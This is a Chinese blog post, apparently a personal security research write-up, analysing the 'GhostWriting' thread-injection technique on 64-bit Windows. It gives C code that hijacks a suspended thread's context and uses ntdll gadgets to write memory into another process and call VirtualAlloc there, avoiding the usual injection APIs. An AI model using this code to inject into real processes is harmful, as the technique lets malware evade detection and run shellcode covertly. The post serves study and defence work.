<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浅析GhostWriting/线程注入</title>
    <link href="/2023/08/10/%E6%B5%85%E6%9E%90GhostWriting_%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/08/10/%E6%B5%85%E6%9E%90GhostWriting_%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>在看雪看到<a href="https://bbs.kanxue.com/user-home-868245.htm">dayday向上8</a>师傅的文章<a href="https://bbs.kanxue.com/thread-277613.htm">来自2007年的鬼写注入</a>，发现这个技术<a href="https://github.com/c0de90e7/GhostWriting">c0de90e7&#x2F;GhostWriting</a>有区别于普通的注入技术。</p><p>GhostWriting不使用 <code>OpenProcess -&gt; VirtualAllocEx -&gt; WriteProcessMemory -&gt; CreateRemoteThread</code> 这一经典注入流程，而是启发性的操作目标线程配合Gadget技术来达到执行的目的。</p><p>故也来研究一番，代码仅为研究，部分功能略写，下文仅做观后感。</p><p>文笔不佳，如有错误，敬请指正。</p><h2 id="0x00-一个开始"><a href="#0x00-一个开始" class="headerlink" title="0x00 一个开始"></a>0x00 一个开始</h2><p>对于一个在运行中的进程来说，我们需要关注的点就是<code>代码执行到的位置</code>(EIP)和<code>当前的堆栈环境</code>(ESP)，值得提一嘴的是线程切换的本质就是ESP的切换。</p><p>而对于每一个线程的执行的情况，又有上下文结构<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-context">CONTEXT</a>来描述。</p><p>我们使用<code>SuspendThread</code>函数挂起线程后，可以对其使用<code>GetThreadContext</code>&#x2F;<code>SetThreadContext</code>函数来<code>获取/设置</code>挂起时的线程上下文环境。</p><p>我们可以修改再设置获取到的上下文环境，然后使用<code>ResumeThread</code>函数使得线程根据我们设置的上下文环境继续运行。</p><p>而这就是GhostWriting的核心思想：通过修改线程上下文的方式来劫持目标线程。</p><h2 id="0x01-逐个击破"><a href="#0x01-逐个击破" class="headerlink" title="0x01 逐个击破"></a>0x01 逐个击破</h2><p>我们的目标是让其他线程执行我们想要执行的功能或者ShellCode。</p><p>由于Windows的内存管理机制，R3进程之间的内存并不共享，线程操作的内存则是依附在进程的内存。</p><p>所以我们如果想要目标线程执行我们的ShellCode，不能直接修改EIP指向我们ShellCode的地址，而是得写入到目标进程，且不使用<code>WriteProcessMemory</code> 类似功能的函数。所以我们就得让目标线程去执行类似于<code>MOV [dstREG],srcREG</code> 这种指令。</p><blockquote><p>Tips： 由于SetContext之后ResumeThread线程，有些易变寄存器是不能修改成功的，测试下来有如下寄存器可以使用：</p><p>​   RBX RBP RSI RDI R9 R12 R13 R14 R15</p></blockquote><p>如何寻找这种指令？</p><p>众所周知，进程在加载的时候都会加载一批系统DLL，例如<code>ntdll.dll</code> <code>kernel32.dll</code>，虽然R3内存不共享，但是这些系统DLL却是用同一份代码，映射的同一个物理页。所以我们可以寻找DLL里存在的指令。当线程执行MOV指令后，就能写到目标进程的内存空间。</p><p>这里我们以<code>ntdll.dll</code>举例，搜索<code>mov [rdi],rsi</code> 指令。</p><p><img src="/img/%E6%B5%85%E6%9E%90GhostWriting_%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20230810133805384.png" alt="image-20230810133805384"></p><p>打开发现命令位于函数中部，那么问题又来了，修改上下文EIP寄存器去指向MOV指令的地址后，不可避免的会执行下面剩余的代码。为了避免执行多余代码对于目标造成的影响，我们尽可能找到位于函数末尾的指令。而函数的末尾，不可避免的会进行堆栈的平衡，retn指令也会影响堆栈，不过我们只需要在修改上下文的时候同时将ESP减去相应的值就可以让堆栈平衡。</p><p>但是问题又来了，retn也会改变EIP，会让程序跑飞。为了避免这个问题最好让ret的返回地址是安全且可知的，这样才能在我们自己的进程中监控到这一目的行为。最简单的方式就跳转到一个死锁的位置，例如<code>JMP SELF</code>，这里直接搜其硬编码<code>EB FE</code>即可。</p><p>那就第一次得先执行一次写入，把自锁地址写入堆栈，就完成了整个前提条件的准备。</p><p>而这又能解决下一个问题，就是执行时机的问题。</p><p>我们定时挂起线程检查EIP是否执行到自锁的位置就能知道这一次的写入是否完成。</p><p>综上所述，我们解决了两个问题：</p><ol><li>通过Gadget将我们预期的数据写入目标进程预期的位置</li><li>判断写入是否完成</li></ol><p>而这两个也是最核心的问题。</p><h2 id="0x02-一一构建"><a href="#0x02-一一构建" class="headerlink" title="0x02 一一构建"></a>0x02 一一构建</h2><p>系统环境：Windows 10 企业版 LTSC 21H2 64bit </p><p>编译环境： </p><p>​- Microsoft Visual Studio Professional 2019 版本 16.11.27</p><p>​- Visual Studio 2019 (v142)</p><p>​- SDK 10.0</p><p>目标进程：自写死循环的控制台进程</p><h2 id="0x03-简易演示"><a href="#0x03-简易演示" class="headerlink" title="0x03 简易演示"></a>0x03 简易演示</h2><p>方便查找均使用导出函数。</p><p>Gadget指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">RtlInitializeGenericTableAvl + 0X4D<br>48 89 7E 50     mov     [rsi+50h], rdi# 通过rdi和rsi写入shellcode，注意在设计写入地址的时候要注意减去0x50。<br>48 8B 74 24 40  mov     rsi, [rsp+28h+arg_10]<br>48 83 C4 20     add     rsp, 20h<br>5F              pop     rdi<br>C3              retn<br></code></pre></td></tr></table></figure><p>自锁指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">RtlIpv6StringToAddressExW + 0x1BB<br></code></pre></td></tr></table></figure><p>核心功能代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C">VOID <span class="hljs-title function_">GwExecuteGadget</span><span class="hljs-params">(IN LPHANDLE lpThreadHandle, IN LPCONTEXT lpContext,IN DWORD64 qwJmpSelf)</span><br>&#123;<br>CONTEXT ctCurrentContext = &#123; <span class="hljs-number">0</span> &#125;;<br>ctCurrentContext.ContextFlags = CONTEXT_FULL;<br><br>GwResumeThread(lpThreadHandle, lpContext);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>Sleep(<span class="hljs-number">30</span>);<br>GwSuspendThreadByHandle(lpThreadHandle, &amp;ctCurrentContext);<br><span class="hljs-keyword">if</span> (ctCurrentContext.Rip == (DWORD64)qwJmpSelf) <span class="hljs-comment">//判断Gadget是否执行完成</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ResumeThread(*lpThreadHandle);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键测试代码：</p><p>这里我只给出第一次写返回地址的代码，写其他数据也同理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">emRefgister64</span></span><br><span class="hljs-class">&#123;</span><br>HEAD = <span class="hljs-number">14</span>,<br>RAX,<br>RCX,<br>RDX,<br>RBX,<br>RSP,<br>RBP,<br>RSI,<br>RDI,<br>R8,<br>R9,<br>R10,<br>R11,<br>R12,<br>R13,<br>R14,<br>R15,<br>RIP<br>&#125;EMRG64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stGadgetInfo</span></span><br><span class="hljs-class">&#123;</span><br>EMRG64 SrcRegister; <span class="hljs-comment">//存储写入数据的寄存器</span><br>EMRG64 DstRegister;<span class="hljs-comment">//存储写入地址的寄存器</span><br>DWORD RegisterOffset;<span class="hljs-comment">//存储地址的寄存器的偏移值</span><br>DWORD dwPreStackSize;<span class="hljs-comment">//提升堆栈大小</span><br>DWORD64 qwGadgetAddress;<span class="hljs-comment">//Gadget指令的地址</span><br>DWORD64 qwAutoLockAddress;<span class="hljs-comment">//自锁指令地址</span><br>&#125;GGIF, *PGGIF;<br><br><span class="hljs-comment">//...</span><br><span class="hljs-comment">//初始化</span><br>GGIF ggGadgetInfo = &#123; <span class="hljs-number">0</span> &#125;;<br>ggGadgetInfo.SrcRegister = RDI;<br>ggGadgetInfo.DstRegister = RSI;<br>ggGadgetInfo.dwPreStackSize = <span class="hljs-number">0x28</span>;<br>ggGadgetInfo.RegisterOffset = <span class="hljs-number">50</span>;<br><span class="hljs-comment">//...</span><br><br>VOID <span class="hljs-title function_">GwWriteReturnAddress</span><span class="hljs-params">(IN LPHANDLE lpThreadHandle, IN PGGIF pGadgetInfo)</span><br>&#123;<br>CONTEXT ctTmp = &#123; <span class="hljs-number">0</span> &#125;;<br>ctTmp.ContextFlags = CONTEXT_FULL;<br>GetThreadContext(*lpThreadHandle, &amp;ctTmp);<br><br>ctTmp.Rsp -= (DWORD64)pGadgetInfo-&gt;dwPreStackSize + <span class="hljs-number">8</span>;<br>ctTmp.Rip = pGadgetInfo-&gt;qwGadgetAddress;<br>    <span class="hljs-comment">//使用数组遍历的方式为寄存器赋值</span><br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;SrcRegister] = pGadgetInfo-&gt;qwAutoLockAddress;<br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;DstRegister] = ctTmp.Rsp + pGadgetInfo-&gt;dwPreStackSize - pGadgetInfo-&gt;RegisterOffset;<br><br>GwExecuteGadget(lpThreadHandle, &amp;ctTmp, pGadgetInfo-&gt;qwAutoLockAddress);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B5%85%E6%9E%90GhostWriting_%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20230810142515748.png" alt="image-20230810142515748"></p><p>RSP: 0x000000eab74ffc28</p><p>RDI: 0x00007ff8208ddd1b（SelfLock）</p><p>RSI：0x000000eab74ffc00</p><p>RIP：0x00007ff82094de29（Gadget）、</p><p>放过去之后成功断下来</p><p><img src="/img/%E6%B5%85%E6%9E%90GhostWriting_%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20230810142551917.png" alt="image-20230810142551917"></p><p><img src="/img/%E6%B5%85%E6%9E%90GhostWriting_%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20230810142630752.png" alt="image-20230810142630752"></p><p>已然写入成功。</p><h2 id="2024-04-17-更新"><a href="#2024-04-17-更新" class="headerlink" title="2024&#x2F;04&#x2F;17 更新"></a>2024&#x2F;04&#x2F;17 更新</h2><p>在上面写入的基础上再进一步深入，让线程执行我们需要的函数，例如VirtualAlloc，并且获取返回值。</p><p>具体思路就是对于堆栈的设计，把预计执行的函数地址放在RSP-8的位置，再把预期的堆栈整体上抬。</p><p>这里会出现一个幺蛾子，在VirtualAlloc的执行过程中，会修改到Rbp+8和Rbp+0x10的位置，如果还是紧接着原本函数堆栈进行提升的话，程序的原始堆栈会遭到破坏，所以最好预留出足够的堆栈空间。</p><p>部分代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stGadgetInfo</span></span><br><span class="hljs-class">&#123;</span><br>EMRG64 SrcRegister; <span class="hljs-comment">//存储写入数据的寄存器</span><br>EMRG64 DstRegister;<span class="hljs-comment">//存储写入地址的寄存器</span><br>DWORD RegisterOffset;<span class="hljs-comment">//存储地址的寄存器的偏移值</span><br>DWORD dwPreStackSize;<span class="hljs-comment">//提升堆栈大小</span><br>DWORD64 dwExtStackSize;<span class="hljs-comment">//额外提升的大小</span><br>DWORD64 qwGadgetAddress;<span class="hljs-comment">//Gadget指令的地址</span><br>DWORD64 qwAutoLockAddress;<span class="hljs-comment">//自锁指令地址</span><br>&#125;GGIF, *PGGIF;<br><br>VOID <span class="hljs-title function_">GwExecuteGadget</span><span class="hljs-params">(IN LPHANDLE lpThreadHandle, IN LPCONTEXT lpContext, IN DWORD64 qwJmpSelf, IN BOOL isHaveRetValue, OUT PDWORD64 pRetValue)</span><br>&#123;<br>CONTEXT ctCurrentContext = &#123; <span class="hljs-number">0</span> &#125;;<br>ctCurrentContext.ContextFlags = CONTEXT_FULL;<br><br>GwResumeThread(lpThreadHandle, lpContext);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>Sleep(<span class="hljs-number">30</span>);<br>GwSuspendThreadByHandle(lpThreadHandle, &amp;ctCurrentContext);<br><span class="hljs-keyword">if</span> (ctCurrentContext.Rip == (DWORD64)qwJmpSelf)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ResumeThread(*lpThreadHandle);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isHaveRetValue)<br>&#123;<br>*pRetValue = ctCurrentContext.Rax;<br>&#125;<br>&#125;<br><br>DWORD64 <span class="hljs-title function_">GwWriteReturnAddress</span><span class="hljs-params">(IN LPHANDLE lpThreadHandle, IN PGGIF pGadgetInfo, IN DWORD dwFuncArgc, IN PDWORD64 pArg, IN DWORD64 pCallFuncAddress)</span><br>&#123;<br>CONTEXT ctTmp = &#123; <span class="hljs-number">0</span> &#125;;<br>ctTmp.ContextFlags = CONTEXT_FULL;<br>GetThreadContext(*lpThreadHandle, &amp;ctTmp);<br><br>ctTmp.Rsp -= (DWORD64)pGadgetInfo-&gt;dwPreStackSize + (DWORD64)pGadgetInfo-&gt;dwExtStackSize;<br>ctTmp.Rip = pGadgetInfo-&gt;qwGadgetAddress;<br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;SrcRegister] = pGadgetInfo-&gt;qwAutoLockAddress;<br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;DstRegister] = ctTmp.Rsp + pGadgetInfo-&gt;dwPreStackSize - pGadgetInfo-&gt;RegisterOffset;<br><br>GwExecuteGadget(lpThreadHandle, &amp;ctTmp, pGadgetInfo-&gt;qwAutoLockAddress, FALSE, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (dwFuncArgc != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">//拷贝函数地址</span><br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;SrcRegister] = pCallFuncAddress;<br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;DstRegister] = ((ctTmp.Rsp + pGadgetInfo-&gt;dwPreStackSize - pGadgetInfo-&gt;RegisterOffset) - <span class="hljs-number">8</span>);<br>GwExecuteGadget(lpThreadHandle, &amp;ctTmp, pGadgetInfo-&gt;qwAutoLockAddress, FALSE, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//push传参</span><br><span class="hljs-comment">//拷贝函数参数</span><br><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">1</span>; i &lt;= (dwFuncArgc - <span class="hljs-number">4</span>); i++)<br>&#123;<br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;SrcRegister] = *(pArg + dwFuncArgc - i);<br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;DstRegister] = ((ctTmp.Rsp + pGadgetInfo-&gt;dwPreStackSize - pGadgetInfo-&gt;RegisterOffset) - ((i + <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">3</span>));<br><br>GwExecuteGadget(lpThreadHandle, &amp;ctTmp, pGadgetInfo-&gt;qwAutoLockAddress, FALSE, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//寄存器传参</span><br><span class="hljs-comment">//参数设置寄存器</span><br>ctTmp.R9 = *(pArg + <span class="hljs-number">3</span>);<br>ctTmp.R8 = *(pArg + <span class="hljs-number">2</span>);<br>ctTmp.Rdx = *(pArg + <span class="hljs-number">1</span>);<br>ctTmp.Rcx = *(pArg + <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//执行函数,获取返回值</span><br>DWORD64 qwRetValue = <span class="hljs-number">0</span>;<br>ctTmp.Rsp -= <span class="hljs-number">0x8</span>;<br>((PDWORD64)&amp;ctTmp)[pGadgetInfo-&gt;DstRegister] = (ctTmp.Rsp + pGadgetInfo-&gt;dwPreStackSize - pGadgetInfo-&gt;RegisterOffset);<br>GwExecuteGadget(lpThreadHandle, &amp;ctTmp, pGadgetInfo-&gt;qwAutoLockAddress, TRUE, &amp;qwRetValue);<br><br><span class="hljs-keyword">return</span> qwRetValue;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E6%B5%85%E6%9E%90GhostWriting_%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240417162445491.png" alt="image-20240417162445491"></p><p>成功申请了</p><p>完整代码：<a href="/files/GhostWrite.zip">GhostWrite.zip</a> </p><blockquote><p> 如果你要对GUI程序进行劫持，那就得向程序发送信息后再恢复线程</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>线程</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
